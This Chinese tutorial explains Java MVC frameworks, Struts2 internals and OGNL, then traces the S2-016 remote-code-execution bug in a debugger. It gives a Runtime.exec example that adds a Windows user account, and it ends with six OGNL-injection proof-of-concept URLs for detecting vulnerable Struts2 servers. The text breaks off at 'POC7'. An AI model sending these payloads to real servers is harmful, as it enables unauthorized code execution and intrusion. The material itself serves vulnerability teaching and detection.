# 攻击JavaWeb应用[5]-MVC安全

##### 注:这一节主要是消除很多人把JSP当作了JavaWeb的全部的误解，了解MVC及其框架思想。MVC是用于组织代码用一种业务逻辑和数据显示分离的方法，不管是Java的Struts2、SpringMVC还是PHP的ThinkPHP都爆出过高危的任意代码执行,本节重在让更多的人了解MVC和MVC框架安全，由浅到深尽可能的照顾没Java基础的朋友。所谓攻击JavaWeb，如果连JavaWeb是个什么，有什么特性都不知道，就算能用Struts刷再多的RANK又有何意义？还不如沏一杯清茶，读一本好书，不浮躁，撸上一天。

### 0x00、初识MVC

* * *

传统的开发存在结构混乱易用性差耦合度高可维护性差等多种问题，为了解决这些毛病分层思想和MVC框架就出现了。MVC是三个单词的缩写,分别为：**模型(Model),视图(View) 和控制(Controller)**。 MVC模式的目的就是实现Web系统的职能分工。

**Model层**实现系统中的**业务逻辑**，通常可以用JavaBean或EJB来实现。

**View*层**用于与**用户的交互**，通常用JSP来实现(前面有讲到，JavaWeb项目中如果不采用JSP作为展现层完全可以没有任何JSP文件，甚至是过滤一切JSP请求，JEECMS是一个最为典型的案例)。

**Controller层**是**Model与View之间沟通的桥梁**，它可以分派用户的请求并选择恰当的视图用于显示，同时它也可以解释用户的输入并将它们映射为模型层可执行的操作。

![2013072423121653672.jpg](http://drops.javaweb.org/uploads/images/5a1a2c77f06494176415a8f29a367481e6c71519.jpg)

#### **Model1和Model2：**

Model1主要是用JSP去处理来自客户端的请求，所有的业务逻辑都在一个或者多个JSP页面里面完成，这种是最不科学的。举例:http://localhost/show_user.jsp?id=2。JSP页面获取到参数id=2就会带到数据库去查询数据库当中id等于 2的用户数据，由于这样的实现方式虽然简单，但是维护成本就非常高。JSP页面跟逻辑业务都捆绑在一起高耦合了。而软件开发的目标就是为了去解耦，让程序之间的依赖性减小。在model1里面SQL注入等攻击简直就是家常便饭。因为在页面里面频繁的去处理各种业务会非常麻烦，更别说关注安全了。典型的Model1的代码就是之前用于演示的SQL注入的JSP页面。

#### **Model1的流程：**

![2013072423125077387.png](http://drops.javaweb.org/uploads/images/0dc00878b4af9407ea77c8b6c06849ed85426645.jpg)

Model 2表示的是基于MVC模式的框架，JSP+Servlet。Model2已经带有一定的分层思想了，即Jsp只做简单的展现层，Servlet做后端的业务逻辑处理。这样视图和业务逻辑就相应的分开了。例如：[http://localhost/ShowUserServlet?id=2](http://localhost/ShowUserServlet?id=2)。也就是说把请求交给Servlet处理，Servlet处理完成后再交给jsp或HTML做页面展示。JSP页面就不必要去关心你传入的id=2是怎么查询出来的，而是怎么样去显示id=2的用户的信息(多是用EL表达式或JSP脚本做页面展现)。视图和逻辑分开的好处是可以更加清晰的去处理业务逻辑，这样的出现安全问题的几率会相对降低。

![2013072423133120903.png](http://drops.javaweb.org/uploads/images/c66eb5d83b33a168cd3382dc85e5d65958add016.jpg)

#### **Mvc框架存在的问题:**

当Model1和Model2都难以满足开发需求的时候，通用性的MVC框架也就产生了，模型视图控制器，各司其责程序结构一目了然，业务安全相关控制井井有序，这便是MVC框架给我们带来的好处，但是不幸的是由于MVC的框架的实现各自不同，某些东西因为其越来越强大，而衍生出来越来越多的安全问题，**典型的由于安全问题处理不当造成近期无数互联网站被黑阔攻击的MVC框架便是Struts2**。神器过于锋利伤到自己也就在所难免了。而在Struts和Spring当中最喜欢被人用来挖0day的就是标签和OGNL的安全处理问题了。

#### **Spring Mvc:**

Spring 框架提供了构建 Web应用程序的全功能 MVC 模块。使用 Spring 可插入的 MVC 架构，可以选择是使用内置的 Spring Web 框架还是 Struts 这样的 Web 框架。通过策略接口，Spring 框架是高度可配置的，而且包含多种视图技术，例如 JavaServer Pages（JSP）技术、Velocity、Tiles、iText 和 POI、Freemarker。Spring MVC 框架并不知道使用的视图，所以不会强迫您只使用 JSP 技术。Spring MVC 分离了控制器、模型对象、分派器以及处理程序对象的角色，这种分离让它们更容易进行定制。

#### **Struts2:**

Struts是apache基金会jakarta项目组的一个开源项目，采用MVC模式，能够很好的帮助我们提高开发web项目的效率。Struts主要采用了servlet和jsp技术来实现，把servlet、jsp、标签库等技术整合到整个框架中。Struts2比Struts1内部实现更加复杂，但是使用起来更加简单，功能更加强大。

Struts2历史版本下载地址：[http://archive.apache.org/dist/struts/binaries/](http://archive.apache.org/dist/struts/binaries/)

官方网站是:[http://struts.apache.org/](http://struts.apache.org/)

#### **常见MVC比较：**

按性能排序：1、Jsp+servlet>2、struts1>2、spring mvc>3、struts2+freemarker>>4、struts2,ognl,值栈。

**开发效率上,基本正好相反。值得强调的是，Spring mvc开发效率和Struts2不相上下。**

Struts2的性能低的原因是因为OGNL和值栈造成的。所以如果你的系统并发量高，可以使用freemaker进行显示，而不是采用OGNL和值栈。这样，在性能上会有相当大得提高。

而每一次Struts2的远程代码执行的原因都是因为OGNL。

当前JavaWeb当中最为流行的MVC框架主要有Spring MVC和Struts。相比Struts2而言，SpringMVC具有更轻巧，更简易，更安全等优点。但是由于SpringMVC历史远没有Struts那么悠久，SpringMVC想要在一朝一夕颠覆Struts1、2还是非常有困难的。

#### **_JavaWeb的Servlet和Filter：_**

可以说JavaWeb和PHP的实现有着本质的区别，PHP属于解释性语言.不需要在服务器启动的时候就通过一堆的配置去初始化apps而是在任意一个请求到达以后再去加载配置完成来自客户端的请求。ASP和PHP有个非常大的共同点就是不需要预先编译成类似Java的字节码文件，所有的类方法都存在于*.PHP文件当中。而在Java里面可以在项目启动时去加载配置到Servlet容器内。在web.xml里面配置一个Servlet或者Filter后可以非常轻松的拦截、过滤来自于客户端的任意后缀请求。在系列2的时候就有提到Servlet，这里再重温一下。

##### **Servlet配置：**

```
<servlet>
    <servlet-name>LoginServlet</servlet-name>
<servlet-class>org.javaweb.servlet.LoginServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>LoginServlet</servlet-name>
    <url-pattern>/servlet/LoginServlet.action</url-pattern>
</servlet-mapping>

```

##### **Filter配置：**

```
<filter>
    <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

```

Filter在JavaWeb当中用来做权限控制再合适不过了，再也不用在每个页面都去做session验证了。假如过滤的url-pattern是/admin/*那么所有URI中带有admin的请求都必须经过如下Filter过滤：

![2013072423184674687.png](http://drops.javaweb.org/uploads/images/549a3d4ea510f1751ee307750e122d8efdbf7ade.jpg)

**Servlet和Filter一样都可以拦截所有的URL的任意方式的请求。**其中url-pattern可以是任意的URL也可以是诸如*.action通配符。既然能拦截任意请求如若要做参数和请求的净化就会非常简单了。servlet-name即标注一个Servlet名为LoginServlet它对应的Servlet所在的类是org.javaweb.servlet.LoginServlet.java。由此即可发散开来，比如如何在Java里面实现通用的恶意请求（通用的SQL注入、XSS、CSRF、Struts2等攻击）？敏感页面越权访问？（传统的动态脚本的方式实现是在每个页面都去加session验证非常繁琐，有了filter过滤器，便可以非常轻松的去限制目录权限）。

上面贴出来的过滤器是Struts2的典型配置,StrutsPrepareAndExecuteFilter过滤了/*，即任意的URL请求也就是Struts2的第一个请求入口。任何一个Filter都必须去实现javax.servlet.Filter的Filter接口，即init、doFilter、destroy这三个接口，这里就不细讲了，有兴趣的朋友自己下载JavaEE6的源码包看下。

```
public void init(FilterConfig filterConfig) throws ServletException;
public void doFilter ( ServletRequest request, ServletResponse response, FilterChain chain ) throws IOException, ServletException;
public void destroy();

```

**TIPS:**

在Eclipse里面看一个接口有哪些实现,选中一个方法快捷键Ctrl+t就会列举出当前接口的所有实现了。例如下图我们可以轻易的看到当前项目下实现Filter接口的有如下接口，其中SecFilter是我自行实现的，StrutsPrepareAndExecuteFilter是Struts2实现的，这个实现是用于Struts2启动和初始化的，下面会讲到：

![2013072423193885093.png](http://drops.javaweb.org/uploads/images/7ca6450a0a17f39480dfb4538e08888bd1ee050f.jpg)

### 0x01、Struts概述

* * *

**_Struts1、Struts2、Webwork关系：_**

Struts1是第一个广泛流行的mvc框架，使用及其广泛。但是，随着技术的发展，尤其是JSF、ajax等技术的兴起，Struts1有点跟不上时代的步伐，以及他自己在设计上的一些硬伤，阻碍了他的发展。

同时，大量新的mvc框架渐渐大踏步发展，尤其是webwork。Webwork是opensymphony组织开发的。Webwork实现了更加优美的设计，更加强大而易用的功能。

后来，struts和webwork两大社区决定合并两个项目，完成struts2.事实上，**struts2是以webwork为核心开发的，更加类似于webwork框架，跟struts1相差甚远**。

#### **STRUTS2框架内部流程：**

```
1. 客户端发送请求的tomcat服务器。服务器接受，将HttpServletRequest传进来。
2. 请求经过一系列过滤器(如：ActionContextCleanUp、SimeMesh等)
3. FilterDispatcher被调用。FilterDispatcher调用ActionMapper来决定这个请求是否要调用某个Action
4. ActionMapper决定调用某个ActionFilterDispatcher把请求交给ActionProxy
5. ActionProxy通过Configuration Manager查看struts.xml，从而找到相应的Action类
6. ActionProxy创建一个ActionInvocation对象
7. ActionInvocation对象回调Action的execute方法
8. Action执行完毕后，ActionInvocation根据返回的字符串，找到对应的result。然后将Result内容通过HttpServletResponse返回给服务器。

```

#### **SpringMVC框架内部流程**：

```
1.用户发送请求给服务器。url：user.do
2.服务器收到请求。发现DispatchServlet可以处理。于是调用DispatchServlet。
3.DispatchServlet内部，通过HandleMapping检查这个url有没有对应的Controller。如果有，则调用Controller。
4.Controller开始执行。
5.Controller执行完毕后，如果返回字符串，则ViewResolver将字符串转化成相应的视图对象；如果返回ModelAndView对象，该对象本身就包含了视图对象信息。
6.DispatchServlet将执视图对象中的数据，输出给服务器。
7.服务器将数据输出给客户端。

```

在看完Struts2和SpringMVC的初始化方式之后不知道有没有对MVC架构更加清晰的了解。

#### **Struts2请求处理流程分析:**

![2013072423210282176.png](http://drops.javaweb.org/uploads/images/01704e514df6b22ca90b5ea32ad111d1ef1dc142.jpg)

```
1、服务器启动的时候会自动去加载当前项目的web.xml
2、在加载web.xml配置的时候会去自动初始化Struts2的Filter，然后把所有的请求先交于Struts的org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.java类去做过滤处理。
3、而这个类只是一个普通的Filter方法通过调用Struts的各个配置去初始化。
4、初始化完成后一旦有action请求都会经过StrutsPrepareAndExecuteFilter的doFilter过滤。
5、doFilter中的ActionMapping去映射对应的Action。
6、ExecuteOperations

```

![2013072423291864880.png](http://drops.javaweb.org/uploads/images/f861764ea76a49034e56a9a24273b01d7fafc080.jpg)

源码、配置和访问截图：

![2013072423293638349.png](http://drops.javaweb.org/uploads/images/02c7874e47990b1fd86c65c318737d030ba5ac92.jpg)

### 0x02、Struts2中ActionContext、ValueStack、Ognl

* * *

在学习Struts命令执行之前必须得知道什么是OGNL、ActionContext、ValueStack。在前面已经强调过很多次容器的概念了。这地方不敢再扯远了，不然就再也扯回不来了。大概理解：tomcat之类的是个大箱子，里面装了很多小箱子，小箱子里面装了很多小东西。而Struts2其实就是在把很多东西进行包装，要取小东西的时候直接从struts2包装好的箱子里面去拿就行了。

#### **ActionContext对象：**

Struts1的Action必须依赖于web容器，他的extecute方法会自动获得HttpServletRequest、HttpServletResponse对象，从而可以跟web容器进行交互。

Struts2的Action不用依赖于web容器，本身只是一个普通的java类而已。但是在web开发中我们往往需要获得request、session、application等对象。这时候，可以通过ActionContext来处理。

ActionContext正如其名，是Action执行的上下文。他内部有个map属性，它存放了Action执行时需要用到的对象。

在每次执行Action之前都会创建新的ActionContext对象，**_通过ActionContext获取的session、request、application并不是真正的HttpServletRequest、HttpServletResponse、ServletContext对象，_**而是将这三个对象里面的值重新包装成了map对象。这样的封装，我们及获取了我们需要的值，同时避免了跟Web容器直接打交道，实现了完全的解耦。

测试代码：

```
public class TestActionContextAction extends ActionSupport{
    private String uname;
    public String execute() throws Exception {
        ActionContext ac = ActionContext.getContext();
        System.out.println(ac);    //在此处定义断点
        return this.SUCCESS;
    }
    //get和set方法省略！
}

```

我们设置断点，debug进去，跟踪ac对象的值。发现他有个table属性，该属性内部包含一个map属性，该map中又有多个map属性，他们分别是：

request、session、application、action、attr、parameters等。

同时，我们跟踪request进去，发现属性attribute又是一个table，再进去发现一个名字叫做”struts.valueStack”属性。内容如下：

![2013072423331472319.png](http://drops.javaweb.org/uploads/images/9061f0810202769c8d8fc2c6d83c08c027e4241b.jpg)

OgnlValueStack可以简单看做List，里面还放了Action对象的引用，通过它可以得到该Action对象的引用。

下图说明了几个对象的关系：

![2013072423333795056.jpg](http://drops.javaweb.org/uploads/images/8b2d00c79f8e4c322c2cd737f441a8f45bce0cff.jpg)

1.  ActionContext、Action本身和HttpServletRequest对象没有关系。但是为了能够使用EL表达式、JSTL直接操作他们的属性。会有**一个拦截器**将ActionContext、Action中的属性通过类似request.setAttribute()方法置入request中(webwork2.1之前的做法)。这样，我们也可以通过：${requestScope.uname}即可访问到ActionContext和Action中的属性。

##### 注：struts2后，使用装饰器模式来实现上述功能。

Action的实例，总是放到value stack中。因为Action放在stack中，而stack是root(根对象)，所以对Action中的属性的访问就可以省略#标记。

#### **获取Web容器信息：**

在上面我**GETSHELL或者是输出回显的时候就必须获取到容器中的请求和响应对象**。而在Struts2中通过ActionContext可以获得session、request、application，但他们并不是真正的HttpServletRequest、HttpServletResponse、ServletContext对象，而是将这三个对象里面的值重新包装成了map对象。 Struts框架通过他们来和真正的web容器对象交互。

```
获得session：ac.getSession().put("s", "ss");
获得request：Map m = ac.get("request");
获得application： ac.getApplication();

```

**获取HttpServletRequest、HttpServletResponse、ServletContext:**

有时，我们需要真正的HttpServletRequest、HttpServletResponse、ServletContext对象，怎么办? 我们可以通过ServletActionContext类来得到相关对象，代码如下：

```
HttpServletRequest req = ServletActionContext.*getRequest*();
ServletActionContext.*getRequest*().getSession();
ServletActionContext.*getServletContext*();

```

#### **Struts2 OGNL:**

OGNL全称是Object-Graph  Navigation  Language(对象图形导航语言)，Ognl同时也是Struts2默认的表达式语言。每一次Struts2的命令执行漏洞都是通过OGNL去执行的。在写这文档之前，乌云的drops已有可够参考的Ognl文章了[http://drops.wooyun.org/papers/340](http://drops.wooyun.org/papers/340)。这里只是简单提下。

```
1、能够访问对象的普通方法
2、能够访问类的静态属性和静态方法
3、强大的操作集合类对象的能力
4、支持赋值操作和表达式串联
5、访问OGNL上下文和ActionContext

```

Ognl并不是Struts专用，我们一样可以在普通的类里面一样可以使用Ognl，比如用Ognl去访问一个普通对象中的属性：

![2013072423341292194.png](http://drops.javaweb.org/uploads/images/635d80771d02bc3830a74ee7d369c55548e6c81c.jpg)

在上面已经列举出了Ognl可以调用静态方法，比如表达式使用表达式去调用runtime执行命令执行：

```
@java.lang.Runtime@getRuntime().exec('net user selina 123 /add')

```

而在Java当中静态调用命令行的方式：

```
java.lang.Runtime.*getRuntime*().exec("net user selina 123 /add");

```

![2013072423342841300.png](http://drops.javaweb.org/uploads/images/e35580f486582fab0211b14bad292b7443c1ff25.jpg)

### 0x03、Struts漏洞

* * *

Struts2究竟是个什么玩意，漏洞爆得跟来大姨妈紊乱似的，连续不断。前面已经提到了由于Struts2默认使用的是OGNL表达式，而OGNL表达式有着访问对象的普通方法和静态方法的能力。开发者无视安全问题大量的使用Ognl表达式这正是导致Struts2漏洞源源不断的根本原因。通过上面的DEMO应该差不多知道了Ognl执行方式，而Struts2的每一个命令执行后面都坚挺着一个或多个可以绕过补丁或是直接构造了一个可执行的Ognl表达式语句。

#### **Struts2漏洞病例：**

Struts2每次发版后都会release要么是安全问题，要么就是BUG修改。大的版本发布过一下几个。

[1.3.x/](http://struts.apache.org/release/1.3.x/)                  2013-02-02 17:59    -    [2.0.x/](http://struts.apache.org/release/2.0.x/)                  2013-02-02 11:22    -    [2.1.x/](http://struts.apache.org/release/2.1.x/)                  2013-03-02 14:52    -    [2.2.x/](http://struts.apache.org/release/2.2.x/)                  2013-02-02 16:00    -    [2.3.x/](http://struts.apache.org/release/2.3.x/)                  2013-06-24 11:30    -    

小版本发布了不计其数，具体的小版本下载地址：[http://archive.apache.org/dist/struts/binaries/](http://archive.apache.org/dist/struts/binaries/)

#### **Struts公开的安全问题：**

1、Remote code exploit on form validation error:[http://struts.apache.org/release/2.3.x/docs/s2-001.html](http://struts.apache.org/release/2.3.x/docs/s2-001.html)

2、Cross site scripting (XSS) vulnerability onandtags：[http://struts.apache.org/release/2.3.x/docs/s2-002.html](http://struts.apache.org/release/2.3.x/docs/s2-002.html)

3、XWork ParameterInterceptors bypass allows OGNL statement execution：[http://struts.apache.org/release/2.3.x/docs/s2-003.html](http://struts.apache.org/release/2.3.x/docs/s2-003.html)

4、Directory traversal vulnerability while serving static content：[http://struts.apache.org/release/2.3.x/docs/s2-004.html](http://struts.apache.org/release/2.3.x/docs/s2-004.html)

5、XWork ParameterInterceptors bypass allows remote command execution：[http://struts.apache.org/release/2.3.x/docs/s2-005.html](http://struts.apache.org/release/2.3.x/docs/s2-005.html)

6、Multiple Cross-Site Scripting (XSS) in XWork generated error pages：[http://struts.apache.org/release/2.3.x/docs/s2-006.html](http://struts.apache.org/release/2.3.x/docs/s2-006.html)

7、User input is evaluated as an OGNL expression when there's a conversion error：[http://struts.apache.org/release/2.3.x/docs/s2-007.html](http://struts.apache.org/release/2.3.x/docs/s2-007.html)

8、Multiple critical vulnerabilities in Struts2：[http://struts.apache.org/release/2.3.x/docs/s2-008.html](http://struts.apache.org/release/2.3.x/docs/s2-008.html)9、ParameterInterceptor vulnerability allows remote command execution[http://struts.apache.org/release/2.3.x/docs/s2-009.html](http://struts.apache.org/release/2.3.x/docs/s2-009.html)

10、When using Struts 2 token mechanism for CSRF protection, token check may be bypassed by misusing known session attributes：[http://struts.apache.org/release/2.3.x/docs/s2-010.html](http://struts.apache.org/release/2.3.x/docs/s2-010.html)

11、Long request parameter names might significantly promote the effectiveness of DOS attacks：[http://struts.apache.org/release/2.3.x/docs/s2-011.html](http://struts.apache.org/release/2.3.x/docs/s2-011.html)

12、Showcase app vulnerability allows remote command execution：[http://struts.apache.org/release/2.3.x/docs/s2-012.html](http://struts.apache.org/release/2.3.x/docs/s2-012.html)

13、A vulnerability, present in the includeParams attribute of the URL and Anchor Tag, allows remote command execution：[http://struts.apache.org/release/2.3.x/docs/s2-013.html](http://struts.apache.org/release/2.3.x/docs/s2-013.html)

14、A vulnerability introduced by forcing parameter inclusion in the URL and Anchor Tag allows remote command execution, session access and manipulation and XSS attacks：[http://struts.apache.org/release/2.3.x/docs/s2-014.html](http://struts.apache.org/release/2.3.x/docs/s2-014.html)

15、A vulnerability introduced by wildcard matching mechanism or double evaluation of OGNL Expression allows remote command execution.：[http://struts.apache.org/release/2.3.x/docs/s2-015.html](http://struts.apache.org/release/2.3.x/docs/s2-015.html)

16、A vulnerability introduced by manipulating parameters prefixed with "action:"/"redirect:"/"redirectAction:" allows remote command execution：[http://struts.apache.org/release/2.3.x/docs/s2-016.html](http://struts.apache.org/release/2.3.x/docs/s2-016.html)

18：A vulnerability introduced by manipulating parameters prefixed with "redirect:"/"redirectAction:" allows for open redirects：[http://struts.apache.org/release/2.3.x/docs/s2-017.html](http://struts.apache.org/release/2.3.x/docs/s2-017.html)

#### **Struts2漏洞利用详情：**

S2-001-S2-004：[http://www.inbreak.net/archives/161](http://www.inbreak.net/archives/161)

S2-005：[http://www.venustech.com.cn/NewsInfo/124/2802.Html](http://www.venustech.com.cn/NewsInfo/124/2802.Html)

S2-006：[http://www.venustech.com.cn/NewsInfo/124/10155.Html](http://www.venustech.com.cn/NewsInfo/124/10155.Html)

S2-007：[http://www.inbreak.net/archives/363](http://www.inbreak.net/archives/363)

S2-008：[http://www.exploit-db.com/exploits/18329/](http://www.exploit-db.com/exploits/18329/)

[http://www.inbreak.net/archives/481](http://www.inbreak.net/archives/481)

S2-009：[http://www.venustech.com.cn/NewsInfo/124/12466.Html](http://www.venustech.com.cn/NewsInfo/124/12466.Html)

S2-010：[http://xforce.iss.net/xforce/xfdb/78182](http://xforce.iss.net/xforce/xfdb/78182)

S2-011-S2-015:[http://blog.csdn.net/wangyi_lin/article/details/9273903](http://blog.csdn.net/wangyi_lin/article/details/9273903)[http://www.inbreak.net/archives/487](http://www.inbreak.net/archives/487)[http://www.inbreak.net/archives/507](http://www.inbreak.net/archives/507)

S2-016-S2-017：[http://www.iteye.com/news/28053#comments](http://www.iteye.com/news/28053#comments)

##### 吐槽一下：

从来没有见过一个框架如此多的漏洞一个连官方修补没怎么用心的框架既有如此多的拥护者。大学和很多的培训机构都把SSH（Spring、Struts2、Hibernate）奉为JavaEE缺一不可的神话。在政府和大型企业中使用JavaWeb的项目中SSH架构体现的更是无处不在。刚开始找工作的出去面试基本上都问：SSH会吗？我们只招本科毕业精通SSH框架的。“？什么？Struts2不会？啥？还不是本科学历？很遗憾，**我们公司更希望跟研究过SSH代码精通Struts MVC、Spring AOP DI OIC和Hibernate的人合作，您先回去等通知吧……**”。多么标准的面试失败的结束语，我只想说：我去年买了个表！

在Struts2如此“权威”、“专制”统治下终于有一个比Struts2更轻盈、更精巧、更安全的框架开始逐渐的威胁着Struts神一样的地位，It’s SpringMvc。

#### **Struts2 Debug：**

关于Struts2的漏洞分析网上已经铺天盖地了，因为一直做SpringMvc开发对Struts2并是怎么关注。不过有了上面的铺垫，分析下Struts2的逻辑并不难。这次就简单的跟一下S2-016的命令执行吧。

##### **Debug Tips：**

```
F5：进入方法
F6：单步执行
F7：从当前方法中跳出，继续往下执行。
F8：跳到下一个断点。
其他：F3：进入方法内、Ctrl+alt+h查看当前方法在哪些地方有调用到。

```

这里还得从上面的Struts2的Filter说起,忘记了的回头看上面的：Struts2请求处理流程分析。

在Struts2项目启动的时候就也会去调用Ognl做初始化，启动后一切的Struts2的请求都会先经过Struts2的StrutsPrepareAndExecuteFilter过滤器（在早期的Struts里默认的是FilterDispatcher）。并从其doFilter开始处理具体的请求，完成Action映射和请求分发。

在Debug之前需要有Struts2的OGNL、Xwork还有Struts的代码。其中的xwork和Struts2的源代码可以在Struts2\struts-2.3.14\src下找到。

![2013072423353385311.png](http://drops.javaweb.org/uploads/images/bce20118697e5b6bb6aa836d2a561798ddf6fa7d.jpg)

Ognl的源码在opensymphony的官方网站可以直接下载到。需要安装SVN客户端checkout下源码。

[http://code.google.com/p/opensymphony-ognl-backup/source/checkout](http://code.google.com/p/opensymphony-ognl-backup/source/checkout)

关联上源代码后可以在web.xml里面找到StrutsPrepareAndExecuteFilter哪行配置，直接Ctrl+左键点进去（或者直接在StrutsPrepareAndExecuteFilter上按F3快速进入到这个类里面去）。在StrutsPrepareAndExecuteFilter的77行行标处双击下就可以断点了。

![2013072423354853231.png](http://drops.javaweb.org/uploads/images/3a36a6a54ab4ffea411586700d7730f5cf55066e.jpg)

至于在Eclipse里面怎么去关联源代码就不多说了，按照eclipse提示找到源代码所在的路径就行了，实在不懂就百度一下。一个正常的Action请求一般情况下是不会报错的。如：[http://localhost/StrutsDemo/test.action](http://localhost/StrutsDemo/test.action)请求处理成功。在这样正常的请求中Ognl表达式找的是location。而注入Ognl表达式之后：

![2013072423360591550.png](http://drops.javaweb.org/uploads/images/ab481809bc11481a8a7972e84d49437323f11e40.jpg)

doFilter的前面几行代码在做初始化，而第84行就开始映射action了。而最新的S2-016就是因为不当的处理action映射导致OGNL注入执行任意代码的。F5进入PrepareOperations的findActionMapping方法。在findActionMapping里面会去调用先去获取一个容器然后再去映射具体的action。通过Dispatcher对象（org.apache.struts2.dispatcher）去获取Container。通过ActionMapper的实现类：org.apache.struts2.dispatcher.mapper.DefaultActionMapper调用getMapping方法，获取mapping。

![2013072423362528215.png](http://drops.javaweb.org/uploads/images/4b1015dd08224ef2d96d35d26a757578918c0645.jpg)

在311行的handleSpecialParameters(request, mapping);F5进入方法执行内部，这个方法在DefaultActionMapper类里边。

![2013072423364170693.png](http://drops.javaweb.org/uploads/images/f32b3e33dedaa328c5ca277e643a250d4cf30d4d.jpg)

从请求当中获取我们提交的恶意Ognl代码：

![2013072423374947672.png](http://drops.javaweb.org/uploads/images/645ea8e67acd71477898972ce07d9bff05e69471.jpg)

handleSpecialParameters方法调用parameterAction.execute(key, mapping);：

![2013072423380255631.png](http://drops.javaweb.org/uploads/images/fc99b834c6ad41afbc8a6dd36bb509dc99d1f447.jpg)

F5进入parameterAction.execute：

![2013072423381815095.png](http://drops.javaweb.org/uploads/images/0a9f10f79bd46751fb770133387f0abf8ce97325.jpg)

执行完成之后的mapping可以看到lication已经注入了我们的Ognl表达式了：

![2013072423384983237.png](http://drops.javaweb.org/uploads/images/29bde6d6429eaea386667d9dade05b5090726057.jpg)

当mapping映射完成后，会回到DefaultActionMapper调用上面处理后的mapping解析ActionName。

```
return parseActionName(mapping)

```

这里拿到的name自然是test了。因为我们访问的只是test.action。不过在Struts2里面还可以用test!show.action即调用test内的show方法。

```
parseNameAndNamespace(uri, mapping, configManager);
handleSpecialParameters(request, mapping);
return parseActionName(mapping);

```

parseActionName执行完成后回到之前的findActionMapping方法。然后把我们的mapping放到请求作用域里边，而mapping对应的键是：struts.actionMapping。此便完成了ActionMapping。那么StrutsPrepareAndExecuteFilter类的doFilter过滤器中的84行的ActionMapping也就完成了。

并不是说action映射完成后就已经执行了Ognl表达式了，而是在StrutsPrepareAndExecuteFilter类第91行的execute.executeAction(request, response, mapping);执行完成后才会去执行我们的Ognl。

executeAction 在org.apache.struts2.dispatcher.ng的ExecuteOperations类。这个方法如下：

```
/**
     * Executes an action
     * @throws ServletException
     */
    public void executeAction(HttpServletRequest request, HttpServletResponse response, ActionMapping mapping) throws ServletException {
        dispatcher.serviceAction(request, response, servletContext, mapping);
    }

```

Dispatcher应该是再熟悉不过了，因为刚才已经在dispatcher里面转悠了一圈回来。现在调用的是dispatcher的 serviceAction方法。

`public void serviceAction`(参数在上面executeAction太长了就不写了)：

![2013072423392595135.png](http://drops.javaweb.org/uploads/images/5637b8ab2ef8fbf1e49de9bea1e3f12b709b2890.jpg)

Excute在`excuteorg.apache.struts2.dispatcher.ServletRedirectResult`类，具体方法如下：

```
public void execute(ActionInvocation invocation) throws Exception {
        if (anchor != null) {
            anchor = conditionalParse(anchor, invocation);
        }
        super.execute(invocation);
    }
    super.execute(org.apache.struts2.dispatcher.StrutsResultSupport)

```

即执行其父类的execute方法。上面的anchor为空。

![2013072423394531727.png](http://drops.javaweb.org/uploads/images/93b109274bf2aa06c569775aa0a0301366607312.jpg)

重点就在translateVariables（翻译变量的时候把我们的Ognl执行了）：

![2013072423400110460.png](http://drops.javaweb.org/uploads/images/69ea0d62c3a309527e5c42ec5b2ba9a35b9e41e8.jpg)

![2013072423401877957.png](http://drops.javaweb.org/uploads/images/624674b6285d0cbe415d5ec257be763990597d22.jpg)

```
Object result = parser.evaluate(openChars, expression, ognlEval, maxLoopCount);
    return conv.convertValue(stack.getContext(), result, asType);

```

最终执行：

![2013072423403243660.png](http://drops.javaweb.org/uploads/images/62a897c160a99573a30e3803f97d5af1ba2750b2.jpg)

F8放过页面输出[/ok]：

![2013072423404664438.png](http://drops.javaweb.org/uploads/images/ad08ba8877715722dfe9f16bfb9110fa4d892a6c.jpg)

#### **解密Struts2的“神秘”的POC：**

在S2-016出来之后Struts2以前的POC拿着也没什么用了，因为S2-016的威力已经大到让百度、企鹅、京东叫唤了。挑几个简单的具有代表性的讲下。在连续不断的看了这么多坑爹的概念以后不妨见识一下Struts2的常用POC。

**回显POC**(快速检测是否存在（有的s2版本无法输出）,看见输出[/ok]就表示存在)：

POC1:

```
http://127.0.0.1/Struts2/test.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman.getWriter().println(%22[/ok]%22)')(d))&(i99)(('\43xman.getWriter().close()')(d))

```

POC2（类型转换漏洞需要把POC加在整型参数上）:

```
http://127.0.0.1/Struts2/test.action?id='%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))%2b'

```

POC3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:

```
http://127.0.0.1/Struts2/hello.action?foo=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(false),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(true),@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))&z[(foo)('meh')]=true

```

POC4:

```
http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(false),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true,%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%22[/ok]%22),%23s3cur1ty.close())(aa)&x[(class.classLoader.jarPath)('aa')]

```

POC5:

```
http://127.0.0.1/Struts2/hello.action?a=1${%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23response=@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22),%23response.close()}

```

POC6:

```
http://127.0.0.1/Struts2/$%7B%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23resp.println(%22[ok]%22),%23resp.close()%7D.action

```

POC7:

```
